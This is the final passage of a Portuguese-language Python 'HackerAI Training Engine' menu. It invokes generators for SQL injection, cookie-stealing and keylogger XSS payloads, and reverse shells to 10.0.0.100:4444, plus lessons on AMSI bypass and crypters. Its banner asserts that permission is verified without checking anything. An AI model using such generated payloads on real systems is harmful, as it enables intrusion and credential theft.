                for tipo in ["basic", "union", "blind", "time", "stacked", "outfile"]:
                    print(f"  {tipo}: {modulo['aulas'].gerar_payload_sql_injection(tipo)}")
                
                print("\n=== XSS ===")
                for tipo in ["basic", "steal_cookie", "keylogger", "phishing", "dom_based", "blind"]:
                    payload = modulo['aulas'].gerar_payload_xss(tipo)
                    print(f"  {tipo}: {payload['payload'][:80]}...")
                
                print("\n=== REVERSE SHELLS ===")
                for lang in ["bash", "python", "php", "nc", "powershell", "perl", "ruby"]:
                    shell = modulo['aulas'].gerar_reverse_shell("10.0.0.100", 4444, lang)
                    print(f"  {lang}: {shell[:100]}...")
            
            elif num_modulo == "4":
                print(json.dumps(modulo['aulas'].aula_phishing(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_pretexting(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "5":
                print(json.dumps(modulo['aulas'].aula_privilege_escalation_linux(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_privilege_escalation_windows(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_movimentacao_lateral(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "6":
                print(json.dumps(modulo['aulas'].aula_ssrf(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_deserializacao(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_graphql(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "7":
                print(json.dumps(modulo['aulas'].aula_aws_enum(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_docker_security(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "8":
                print(json.dumps(modulo['aulas'].aula_buffer_overflow(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_rop(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "9":
                print(json.dumps(modulo['aulas'].aula_wifi(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_bluetooth(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "10":
                print(json.dumps(modulo['aulas'].aula_deteccao_intrusao(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_hardening(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "11":
                print(json.dumps(modulo['aulas'].aula_amsi_bypass(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_packer_crypter(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "12":
                print(json.dumps(modulo['aulas'].aula_ad_ataques(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_ad_defesa(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "13":
                print(json.dumps(modulo['aulas'].aula_hash_cracking(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "14":
                print("=== SCANNER DE PORTAS ===")
                print(modulo['aulas'].criar_scanner_portas())
                print("\n=== WEB FUZZER ===")
                print(modulo['aulas'].criar_web_fuzzer())
            
            elif num_modulo == "15":
                for nivel in ["facil", "medio", "dificil"]:
                    desafio = modulo['aulas'].gerar_desafio(nivel)
                    print(f"\n=== DESAFIO {nivel.upper()} ===")
                    print(json.dumps(desafio, indent=2, ensure_ascii=False))
        else:
            print(f"Módulo {num_modulo} não encontrado!")
    
    def menu_interativo(self):
        """Menu interativo do motor de treinamento"""
        while True:
            print("\n" + "=" * 60)
            print("HACKERAI TRAINING ENGINE v3.0")
            print("=" * 60)
            print("1. Listar Módulos")
            print("2. Listar Trilhas de Aprendizado")
            print("3. Executar Módulo")
            print("4. Executar Trilha Completa")
            print("5. Gerar Relatório de Progresso")
            print("0. Sair")
            print("=" * 60)
            
            opcao = input("\nEscolha uma opção: ").strip()
            
            if opcao == "1":
                self.listar_modulos()
            
            elif opcao == "2":
                self.listar_trilhas()
            
            elif opcao == "3":
                self.listar_modulos()
                num = input("\nDigite o número do módulo: ").strip()
                self.executar_modulo(num)
            
            elif opcao == "4":
                self.listar_trilhas()
                trilha = input("\nDigite o nome da trilha: ").strip().lower()
                if trilha in self.trilhas:
                    for num_mod in self.trilhas[trilha]:
                        self.executar_modulo(num_mod)
                        input("\nPressione Enter para continuar...")
                else:
                    print("Trilha não encontrada!")
            
            elif opcao == "5":
                print("\nRelatório de Progresso:")
                print(f"  Módulos completados: 0/15")
                print(f"  Desafios resolvidos: 0")
                print(f"  Nível atual: Iniciante")
                print(f"  Próxima trilha recomendada: iniciante")
            
            elif opcao == "0":
                print("\nEncerrando HackerAI Training Engine. Até logo!")
                break
            
            else:
                print("Opção inválida!")

# ============================================================
# EXECUÇÃO PRINCIPAL
# ============================================================

if __name__ == "__main__":
    engine = HackerAITrainingEngine()
    
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║              HACKERAI TRAINING ENGINE v3.0               ║
    ║         Motor de IA para Treinamento em Segurança        ║
    ║                                                          ║
    ║  ⚠️  USO EXCLUSIVO PARA PROFISSIONAIS AUTORIZADOS       ║
    ║  ✅ Permissão verificada - Ambiente controlado           ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    # Modo interativo
    engine.menu_interativo()